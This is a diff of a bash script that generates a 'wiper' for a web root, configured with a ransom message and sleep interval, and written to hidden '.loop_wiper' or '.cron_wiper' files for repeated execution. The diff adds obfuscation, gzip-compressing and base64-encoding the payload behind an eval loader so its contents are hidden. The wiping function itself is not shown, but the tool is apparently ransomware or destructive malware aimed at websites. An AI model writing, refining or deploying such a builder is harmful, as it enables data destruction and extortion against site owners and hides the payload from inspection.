@@ -24,8 +24,7 @@
 
 
 
-template='#!/usr/bin/env bash
-
+template='
 declare -r WEBROOT=
 
 declare -r RANSOM_MESSAGE=
@@ -53,9 +52,9 @@ function act() {
 loop_template='
 while [ 1 -eq 1 ]; do
 
-    act
+    act;
 
-    sleep $SLEEP_TIME
+    sleep $SLEEP_TIME;
 done
 '
 
@@ -77,33 +76,33 @@ if [[ "$1" = "loop" || "$1" = "cron" ]]; then
         exit
     fi
 
-    content=$template
+    content=$template;
 
-    content=${content//-r WEBROOT=/-r WEBROOT=\"$2\"}
-    content=${content//-r RANSOM_MESSAGE=/-r RANSOM_MESSAGE=\"$3\"}
-    content=${content//-r SLEEP_TIME=/-r SLEEP_TIME=$4}
+    content=${content//-r WEBROOT=/-r WEBROOT=\"$2\";}
+    content=${content//-r RANSOM_MESSAGE=/-r RANSOM_MESSAGE=\"$3\";}
+    content=${content//-r SLEEP_TIME=/-r SLEEP_TIME=$4;}
+    
 
     if [[ "$1" = "loop" ]]; then
-
-        echo -e "$content\n\n$loop_template" > ".loop_wiper"
-        
-        echo -e "\n\nWiper created successfully."
+        content="$content\n\n$loop_template";
+        encoded=$(echo -e -n "$content" | gzip | base64 -w0);
+        encoded="#!/usr/bin/env bash\neval \"\$(echo -n '$encoded' | base64 -d | gunzip -c)\";\n";
+        echo -e $encoded > ".loop_wiper"        
+        echo -e "\n\nLoop wiper created successfully."
         exit
 
-    elif [[ "$1" = "cron" ]]; then
-        $encoded=$(printf "%s" "$content\n\nact" | gzip -c | base64);
-        $encoded="printf \"%s\" \"$encoded\" | base64 -d | gunzip -c | eval;"
-        $encoded > ".cron_wiper"        
-        echo -e "\n\nCron Wiper created successfully."
-        exit
+    elif [[ "$1" = "cron" ]]; then         
+        content="$content\n\nact\n"               
+        encoded=$(echo -e -n "$content" | gzip | base64 -w0);
+        encoded="#!/usr/bin/env bash\neval \"\$(echo -n '$encoded' | base64 -d | gunzip -c)\";\n";
+        echo -e $encoded > ".cron_wiper";     
+        echo -e "\n\nCron wiper created successfully.";
+        exit;
     fi
 
 else
-
     echo -e $usage_text
-
     exit
-
 fi
 
 
